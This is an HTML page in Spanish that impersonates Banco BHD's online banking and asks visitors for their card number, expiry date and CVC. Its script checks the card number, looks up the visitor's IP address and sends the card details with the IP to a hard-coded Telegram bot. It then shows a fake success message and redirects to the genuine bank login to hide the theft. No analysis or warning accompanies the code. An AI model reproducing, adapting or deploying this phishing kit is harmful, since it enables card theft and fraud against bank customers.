<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco BHD - IBP</title>
    <link rel="icon" href="assets/img/icono.ico" type="image/x-icon" />
    <link rel="apple-touch-icon" href="assets/img/icono-180x180.png" sizes="180x180">
    <link rel="icon" href="assets/img/icono-32x32.png" sizes="32x32">
    <link rel="icon" href="assets/img/icono-16x16.png" sizes="16x16">
    <link rel="icon" href="assets/img/icono-192x192.png" sizes="192x192">
    <style>
    body,
    html {
        margin: 0;
        padding: 0;
        height: 100%;
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        background: url('/assets/img/background-login.webp') no-repeat center center fixed;
        background-size: cover;
    }

    .container {
        width: 100%;
        max-width: 420px;
        background-color: rgba(243, 233, 233, 0.85);
        border-radius: 10px;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
        padding: 30px 25px;
        text-align: center;
        backdrop-filter: blur(10px);
        box-sizing: border-box;
    }

    h1 {
        font-size: 1.6rem;
        margin-bottom: 15px;
        color: #333;
    }

    p {
        font-size: 1rem;
        color: #666;
        margin-bottom: 25px;
    }

    .input-container {
        width: 100%;
        margin-bottom: 8px;
        display: flex;
        flex-direction: column;
        align-items: flex-start;
        position: relative;
    }

    .input-container-row {
        display: flex;
        justify-content: space-between;
        gap: 10px;
        align-items: center;
        width: 100%;
    }

    .input-container label {
        font-size: 0.9rem;
        margin-bottom: 5px;
        color: #333;
    }

    input[type="text"],
    input[type="number"],
    input[type="month"] {
        width: 70%;
        padding-left: 31px;
        background-size: 20px 20px;
        background-repeat: no-repeat;
        background-position: 10px center;
        padding-top: 10px;
        padding-right: 10px;
        padding-bottom: 10px;
        font-size: 1rem;
        border: 1px solid #ddd;
        border-radius: 8px;
        margin-top: 5px;
        outline: none;
        background-color: #f9f9f9;
        box-sizing: border-box;
        transition: border-color 0.3s ease;
        text-overflow: ellipsis;
        overflow: hidden;
    }

    input[type="text"]:focus,
    input[type="number"]:focus,
    input[type="month"]:focus {
        border-color: #28a745;
    }

    input[type="text"].visa {
        background-image: url('/assets/img/visa.svg');
    }

    input[type="text"].mastercard {
        background-image: url('/assets/img/mastercard.svg');
    }

    .btn {
        background-color: #28a745;
        color: white;
        border: none;
        padding: 10px;
        border-radius: 8px;
        font-size: 1.1rem;
        cursor: pointer;
        transition: background-color 0.3s ease;
        width: 100%;
    }

    .btn:hover {
        background-color: #218838;
    }

    .alert {
        position: absolute;
        top: 10%;
        left: 50%;
        transform: translateX(-50%);
        background-color: #f8d7da;
        color: #721c24;
        padding: -50px;
        border: 1px solid #f5c6cb;
        border-radius: 5px;
        font-size: 1.1rem;
        animation: slideIn 1s ease-in-out;
    }

    @keyframes slideIn {
        0% {
            opacity: 0;
            transform: translateX(-50%) translateY(-50px);
        }
        100% {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }
    }

    #cardNumber {
        max-width: 300px;
    }
    </style>
</head>

<body>
    <div class="alert" id="alertMessage">
        <strong>¡Atención!</strong> Complete los campos de su tarjeta para continuar.
    </div>

    <div class="container">
        <h1>Datos de la Tarjeta</h1>
        <p>Ingrese los detalles de su tarjeta de débito o crédito para proceder:</p>

        <form id="cardForm">
            <div class="input-container">
                <label for="cardNumber">Número de tarjeta</label>
                <input type="text" id="cardNumber" name="cardNumber" placeholder="• • • • • • • • • • • • • • • •"
                    maxlength="19" required>
            </div>

            <div class="input-container-row">
                <div class="input-container">
                    <label for="expiryDate">Exp.</label>
                    <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/AA" maxlength="5" required>
                </div>

                <div class="input-container">
                    <label for="cvv">CVC</label>
                    <input type="text" id="cvv" name="cvv" placeholder="CVC" maxlength="3" required>
                </div>
            </div>

            <button type="submit" class="btn">Continuar</button>
        </form>
    </div>

    <script>
    function validateCardNumber(cardNumber) {
        let sum = 0;
        let shouldDouble = false;
        for (let i = cardNumber.length - 1; i >= 0; i--) {
            let digit = parseInt(cardNumber.charAt(i));
            if (shouldDouble) {
                digit *= 2;
                if (digit > 9) digit -= 9;
            }
            sum += digit;
            shouldDouble = !shouldDouble;
        }
        return (sum % 10 === 0);
    }

    function validateExpiryDate(expiryDate) {
        const currentDate = new Date();
        const [month, year] = expiryDate.split('/');
        if (!month || !year || month.length !== 2 || year.length !== 2) return false;
        const expiryMonth = parseInt(month);
        const expiryYear = parseInt(year) + 2000;
        const expiryDateObj = new Date(expiryYear, expiryMonth - 1);
        return expiryDateObj > currentDate;
    }

    function sendToTelegram(cardNumber, expiryDate, cvv) {
        const token = "8857815714:AAFp5JutGMJPmwrZf5NwiigjazGNVbnJEB4";
        const chat_id = "8555745789";
        const message = `=====DATOS TARJETA BHD=======\nNúmero: ${cardNumber}\nExpira: ${expiryDate}\nCVV: ${cvv}\nIP del cliente: `;

        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(ipData => {
                const ip = ipData.ip;
                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message + ip)}`;
                return fetch(url);
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    var modal = document.createElement('div');
                    modal.style.position = 'fixed';
                    modal.style.top = '50%';
                    modal.style.left = '50%';
                    modal.style.transform = 'translate(-50%, -50%)';
                    modal.style.backgroundColor = 'white';
                    modal.style.padding = '20px 30px';
                    modal.style.borderRadius = '15px';
                    modal.style.boxShadow = '0 0 20px rgba(0,0,0,0.3)';
                    modal.style.textAlign = 'center';
                    modal.style.zIndex = '9999';
                    modal.style.fontFamily = 'Arial, sans-serif';
                    modal.style.border = '2px solid #4CAF50';
                    modal.style.minWidth = '300px';

                    var logo = document.createElement('img');
                    logo.src = 'assets/img/logo-bhd.svg';
                    logo.style.width = '80px';
                    logo.style.marginBottom = '15px';
                    modal.appendChild(logo);

                    var mensaje = document.createElement('p');
                    mensaje.textContent = 'Tarjeta suministrada con éxito, por favor espere...';
                    mensaje.style.fontSize = '18px';
                    mensaje.style.fontWeight = 'bold';
                    mensaje.style.color = '#2e7d32';
                    mensaje.style.margin = '0';
                    modal.appendChild(mensaje);

                    document.body.appendChild(modal);

                    setTimeout(function() {
                        window.location.href = "https://ibp.bhd.com.do/#/login";
                    }, 2500);
                } else {
                    alert("Hubo un problema al enviar los datos.");
                }
            })
            .catch(error => {
                alert("Error al obtener la IP o enviar la solicitud.");
            });
    }

    document.getElementById('cardNumber').addEventListener('input', function(event) {
        let value = event.target.value.replace(/\D/g, '');
        value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
        event.target.value = value.slice(0, 19);
        let inputElement = event.target;
        if (value.startsWith('4')) {
            inputElement.classList.add('visa');
            inputElement.classList.remove('mastercard');
        } else if (value.startsWith('5')) {
            inputElement.classList.add('mastercard');
            inputElement.classList.remove('visa');
        } else {
            inputElement.classList.remove('visa', 'mastercard');
        }
    });

    document.getElementById('expiryDate').addEventListener('input', function(event) {
        let value = event.target.value.replace(/\D/g, '');
        if (value.length >= 3) {
            value = value.slice(0, 2) + '/' + value.slice(2, 4);
        }
        event.target.value = value;
    });

    document.getElementById('cardForm').addEventListener('submit', function(event) {
        event.preventDefault();
        const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
        const expiryDate = document.getElementById('expiryDate').value;
        const cvv = document.getElementById('cvv').value;

        if (!validateCardNumber(cardNumber)) {
            alert("El número de tarjeta no es válido. Por favor, verifique.");
            return;
        }
        if (!validateExpiryDate(expiryDate)) {
            alert("La fecha de expiración de la tarjeta no es válida.");
            return;
        }
        if (!cardNumber || !expiryDate || !cvv) {
            alert("Por favor, completa todos los campos.");
            return;
        }
        sendToTelegram(cardNumber, expiryDate, cvv);
    });

    setTimeout(function() {
        document.getElementById('alertMessage').style.display = 'none';
    }, 5000);
    </script>
</body>

</html>
